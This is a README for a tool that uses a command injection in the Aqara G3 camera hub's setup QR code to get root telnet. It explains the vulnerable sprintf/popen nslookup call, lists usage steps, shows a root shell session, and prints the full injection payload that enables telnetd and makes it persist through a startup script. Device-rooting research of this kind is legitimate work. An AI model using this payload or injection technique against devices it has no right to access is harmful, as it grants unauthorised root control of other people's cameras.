# aQRootG3 #
### Enable telnet via qrcode command injection for Aqara G3 hub ###

<p align="center" width="100%">
    <img src="https://user-images.githubusercontent.com/1288525/146663111-146c18cc-f337-49a9-99b9-0e8f93e97e3a.jpg"> 
</p>


Intro
---------------
I was disappointed to see the Aqara G3 camera did not ship with telnet enabled so I managed to grab a copy of a firmware update for some good 'ol static analysis which confirmed none of the previous methods were going to work. Whilst going through  "ha_master" I did see that one of the variables passed in by the setup qrcode is thrown through sprintf as "nslookup %s" and subsequently passed to popen. (yay)
Getting telnet was fairly trivial, getting persistent telnet in one shot within the 132 char sprintf buffer and on a readonly filesystem was a little more challenging.
(Aqara have also changed their key ciphering for ssid and pwd)


Usage
---------------
```bash
usage: aQRootG3.py [-h] ssid pwd [filename]

aQRootG3 v0.1
Enable telnet via qrcode command injection for Aqara G3 hub

positional arguments:
  ssid        Wireless SSID
  pwd         Wireless Password
  filename    (Optional) Save QR Code as image

optional arguments:
  -h, --help  show this help message and exit
```


Steps
---------------
1. Reset the camera by pressing the button 10 times quickly.
2. When prompted (albeit probably in chinese) scan the QR code you've generated
3. This will give a failed message (due to invalid bind_key)
4. Add device to Aqara home as normal.
5. Enjoy.

```bash
$ telnet x.x.x.x
Trying x.x.x.x...
Connected to x.x.x.x.
Escape character is '^]'.

Camera-Hub-G3-BEEF login: root
Password:
1 ulimit=256
~ # uname -a
Linux Camera-Hub-G3-BEEF 4.9.84 #67 SMP PREEMPT Mon Sep 6 17:51:23 CST 2021 armv7l GNU/Linux
```


Payload Explanation
---------------
```python
payload = {
    "b": f"lumiLZc1dhEfPzMN",               # Made up bind_key
    "d": ";".join(
        [
            domain,                         # Domain being queried by nslookup, defaulting to "aiot-coap.aqara.cn"
            'x="fw_""manager.sh"',          # Workaround - Script checks if it's already running by grepping ps.
            "$x -t -k",                     # Enable tty and telnetd
            "$x -t -f",                     # Create default /data/scripts/post_init.sh
            "y=/data/scripts/post_init.sh",
            'echo "$x -t -k" >> $y',        # Append tty enable and telnetd start to post_init script
            "chmod 555 $y",                 # Remove write access to post_init script
        ]
    ),
    "x": cipher(ssid.encode()),             # Ciphered SSID
    "y": cipher(pwd.encode()),              # Ciphered Wireless Password
    "l": "en",                              # Language
}
```

Tested Versions
---------------

| Market | Firmware Version | Status |
| -------| --------------- | -- |
| China | 3.2.7_0019.0004 | :white_check_mark: |
| China  | 3.3.2_0003.0004  | :white_check_mark: |

